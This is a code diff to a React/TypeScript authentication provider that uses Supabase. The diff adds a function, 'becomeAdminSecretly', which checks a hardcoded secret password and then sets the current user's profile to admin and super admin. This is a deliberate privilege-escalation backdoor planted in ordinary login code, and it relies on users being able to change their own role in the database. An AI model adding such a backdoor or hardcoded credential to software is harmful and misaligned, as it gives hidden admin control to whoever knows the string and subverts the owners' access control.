@@ -18,6 +18,7 @@ interface AuthContextType {
   refreshProfile: () => Promise<void>;
   signInWithEmail: (email: string, pass: string) => Promise<{ error: any }>;
   signInWithGoogle: () => Promise<{ error: any }>;
+  becomeAdminSecretly: (pass: string) => Promise<{ error: string | null }>;
 }
 
 const AuthContext = createContext<AuthContextType | null>(null);
@@ -119,6 +120,19 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     return { error };
   };
 
+  const becomeAdminSecretly = async (pass: string) => {
+    if (pass !== '0611986724za') return { error: 'รหัสลับไม่ถูกต้อง' };
+    if (!user) return { error: 'กรุณาล็อกอินก่อนใช้รหัสลับ' };
+
+    const { error } = await supabase.from('profiles').update({
+      role: 'admin',
+      is_super_admin: true
+    }).eq('id', user.id);
+
+    if (!error) await fetchProfile(user.id);
+    return { error: error ? error.message : null };
+  };
+
   const refreshProfile = async () => {
     if (user) await fetchProfile(user.id);
   };
@@ -131,7 +145,8 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   return (
     <AuthContext.Provider value={{
       user, profile, isAdmin, isRider, isSuperAdmin, loading, needsOnboarding,
-      sendOtp, verifyOtp, signOut, refreshProfile, signInWithEmail, signInWithGoogle
+      sendOtp, verifyOtp, signOut, refreshProfile, signInWithEmail, signInWithGoogle,
+      becomeAdminSecretly
     } as AuthContextType}>
       {children}
     </AuthContext.Provider>
